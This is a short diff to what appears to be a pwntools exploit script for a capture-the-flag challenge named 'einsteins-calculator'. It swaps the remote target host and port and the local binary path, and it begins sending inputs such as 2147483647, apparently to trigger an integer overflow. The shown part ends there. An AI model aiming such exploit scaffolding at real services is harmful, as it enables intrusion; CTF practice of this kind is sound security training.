@@ -1,11 +1,11 @@
 from pwn import *
 
 if args.REMOTE:
-    host = "challs.umasscybersec.org"
-    port = 2337
+    host = "34.75.76.65"
+    port = 9002
     p = remote(host, port)
 else:
-    p = process('./einsteins-calculator')
+    p = process('./static/einsteins-calculator')
 
 p.sendline(b'0') # input
 p.sendline(b'2147483647') # t1
